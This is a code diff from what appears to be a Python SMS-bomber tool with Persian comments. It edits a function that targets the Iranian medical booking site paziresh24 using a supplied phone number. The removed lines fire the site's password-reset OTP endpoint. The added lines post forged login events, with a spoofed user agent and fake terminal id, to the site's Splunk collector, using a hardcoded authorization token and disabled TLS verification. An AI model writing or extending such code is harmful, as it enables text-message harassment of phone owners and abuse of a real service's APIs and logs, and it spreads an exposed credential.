@@ -67,77 +67,55 @@ def send_service_safe(service, phone):
 
 def paziresh24(phone):
     try:
-        # استفاده از فرمت بین‌المللی +98
+        # استفاده از فرمت بین‌المللی
         formatted_phone = phone if phone.startswith("+98") else f"+98{phone.replace('+98', '').lstrip('0')}"
         
-        session = requests.Session()
-
-        # ثبت رویداد اولیه در Splunk
-        splunk_headers = {
+        headers = {
             "Authorization": "Splunk cd46b97e-bf0d-46e4-ba7e-111c2f88291f",
             "Content-Type": "application/json",
         }
-
-        load_event = {
+        
+        payload = {
             "sourcetype": "_json",
             "event": {
                 "event_group": "legacy-login-steps",
-                "event_type": "load",
+                "event_type": "submit-mobile-number",  # تغییر به submit-mobile-number
                 "url": {
                     "href": "https://www.paziresh24.com/patient/",
                     "query": "",
-                    "pathname": "/patient/",
+                    "pathname": "/patient/", 
                     "host": "www.paziresh24.com"
                 },
                 "popupForm": True,
                 "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
                 "terminal_id": "clinic-68b0f1d69b0897.11243898",
                 "is_application": False,
-                "phone_number": formatted_phone  # اضافه کردن شماره
+                "phone_number": formatted_phone,  # اضافه کردن شماره
+                "action": "request_otp"  # اضافه کردن action
             }
         }
-
-        session.post(
-            "https://gozargah-splunk.paziresh24.com/services/collector",
-            json=load_event,
-            headers=splunk_headers,
-            timeout=5,
-            verify=False
-        )
-
-        # هدرهای API
-        api_headers = {
-            "Accept": "application/json, text/plain, */*",
-            "accept-timezone": "Asia/Tehran",
-            "content-type": "application/json; charset=utf-8",
-        }
-
-        payload = {"mobile": formatted_phone}  # با فرمت +98912...
         
-        response = session.post(
-            "https://apigw.paziresh24.com/gozargah/resetpassword",
+        response = requests.post(
+            "https://gozargah-splunk.paziresh24.com/services/collector",
             json=payload,
-            headers=api_headers,
+            headers=headers,
             timeout=10,
             verify=False
         )
-
-        print(f'{y}[paziresh24] Status: {response.status_code}{a}')
-        print(f'{y}[paziresh24] Response: {response.text}{a}')
-
-        if response.status_code == 200:
-            data = response.json()
-            if data.get("status") == 1:
-                print(f'{g}(paziresh24) SMS sent successfully! ✅{a}')
-                return True
         
-        print(f'{r}[-] paziresh24 failed{a}')
-        return False
-
+        print(f'{y}[paziresh24] Status: {response.status_code}{a}')
+        
+        if response.status_code == 200:
+            print(f'{g}(paziresh24) Log event sent successfully! ✅{a}')
+            return True
+        else:
+            print(f'{r}[-] paziresh24 error: {response.status_code}{a}')
+            return False
+            
     except Exception as e:
         print(f'{r}[!] paziresh24 exception: {e}{a}')
         return False
-
+        
                 
 
 def tebinja(phone):
